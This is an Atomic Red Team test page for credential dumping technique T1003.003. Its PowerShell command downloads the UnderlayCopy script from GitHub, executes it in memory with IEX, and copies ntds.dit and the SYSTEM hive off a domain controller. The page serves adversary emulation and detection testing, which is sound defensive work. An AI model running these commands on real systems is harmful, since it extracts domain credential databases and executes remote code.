---
atomic_guid: "f57cb283-c131-4e2f-8a6c-363d575748b2"
title: "Copy NTDS in low level NTFS acquisition via MFT parsing"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003.003"
attack_technique_name: "OS Credential Dumping: NTDS"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "f57cb283-c131-4e2f-8a6c-363d575748b2"
  - "Copy NTDS in low level NTFS acquisition via MFT parsing"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Copy NTDS in low level NTFS acquisition via MFT parsing

This test is intended to be run on a domain Controller.

UnderlayCopy is a PowerShell utility for low-level NTFS acquisition and dumping protected, locked system artifacts (for example: SAM, SYSTEM, NTDS.dit, registry hives, and other files that are normally inaccessible while Windows is running).

## Metadata

- Atomic GUID: f57cb283-c131-4e2f-8a6c-363d575748b2
- Technique: T1003.003: OS Credential Dumping: NTDS
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1003.003/T1003.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping|T1003.003]]

## Input Arguments

### extract_path

- description: Path for extracted NTDS.dit
- type: string
- default: C:\Windows\Temp

### script_url

- description: URL to UnderlayCopy script
- type: url
- default: https://raw.githubusercontent.com/kfallahi/UnderlayCopy/37f2e9b76b724bc1211437b14deaf1e76b21791e/UnderlayCopy.ps1

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR #{script_url} -UseBasicParsing)
Underlay-Copy -Mode MFT -SourceFile C:\Windows\NTDS\ntds.dit -DestinationFile #{extract_path}\ntds.dit
Underlay-Copy -Mode MFT -SourceFile C:\Windows\System32\config\SYSTEM -DestinationFile #{extract_path}\SYSTEM_HIVE
```

### Cleanup

```powershell
remove-item "#{extract_path}\ntds.dit" -force -erroraction silentlycontinue
remove-item "#{extract_path}\SYSTEM_HIVE" -force -erroraction silentlycontinue
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.yaml)
